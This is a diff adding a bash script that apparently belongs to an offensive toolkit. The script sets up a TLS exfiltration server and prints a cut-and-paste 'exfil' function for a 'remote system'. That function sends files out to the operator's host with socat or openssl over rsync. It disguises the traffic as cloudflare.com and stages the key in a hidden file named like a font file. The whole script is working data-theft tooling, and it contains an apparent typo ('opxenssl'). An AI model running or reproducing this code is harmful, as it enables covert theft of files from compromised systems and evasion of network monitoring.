@@ -1,0 +1,45 @@
+#! /bin/bash
+
+source /sf/bin/funcs.sh
+source /sf/bin/funcs_rport.sh
+
+sf_rport_load_all || exit
+
+pemfn="/tmp/.sf_exfil_ssl.pem"
+[[ ! -f "$pemfn" ]] && {
+    openssl req -subj '/CN=cloudflare.com/O=EL/C=XX' -new -newkey ed25519 -days 3650 -nodes -x509 -keyout - >"$pemfn" 2>/dev/null
+}
+
+echo -en "\
+Cut & paste the following lines into the REMOTE SYSTEM:${CF}
+########[[ ${CDR}START CUT & PASTE FROM HERE${CN}${CF} ]]######################################
+${CM}${CF}SF_EXFIL_PEM=\"$(<"$pemfn")\"
+exfil() {
+    local fn=\"/tmp/.font-unix-ex\"
+    local concmd
+    command -v socat &>/dev/null && {
+        concmd=\"socat - OPENSSL-CONNECT:${rip}:${rport}\"
+        concmd+=\",cert=\$fn,cafile=\$fn,verify=0\"
+    }
+    command -v opxenssl &>/dev/null && {
+        concmd=\"openssl s_client -connect ${rip}:${rport}\"
+        concmd+=\" -servername cloudflare.com -cert \$fn\"
+        concmd+=\" -CAfile \$fn -quiet\"
+    }
+    [[ -z \"\$concmd\" ]] && { echo >&2 \"Need openssl or socat.\"; return; }
+    echo \"\$SF_EXFIL_PEM\" >\"\$fn\"
+    rsync -ahPR -e \"sh -c '\$concmd' #\" -- \"\$@\" 0:
+    rm -f \"\${fn:?}\"
+}${CN}${CF}
+########[[ ${CDR}DO NOT CUT & PASTE BEYOND THIS POINT${CN}${CF} ]]##############################
+${CN}To exfil data from the REMOTE SYSTEM type the following on the REMOTE SYSTEM:
+    ${CDC}exfil *.php *.tar.gz   ${CN}${CF}# Uploads to ${CDY}${CF}$(pwd)
+    ${CDC}exfil /var/www/warez   ${CN}${CF}# Uploads to ${CDY}${CF}$(pwd)/var/www/warez
+    ${CDC}exfil /var/www/./warez ${CN}${CF}# Uploads to ${CDY}${CF}$(pwd)/warez
+
+${CN}${CDG}Exfil Server is running.
+Press ${CDM}CTRL-c${CDG} to stop.
+${CN}"
+
+socat OPENSSL-LISTEN:${rport},reuseaddr,fork,cert="$pemfn",cafile="$pemfn" EXEC:"rsync --server -logtprR --safe-links --partial ."
+rm -f "${pemfn:?}"
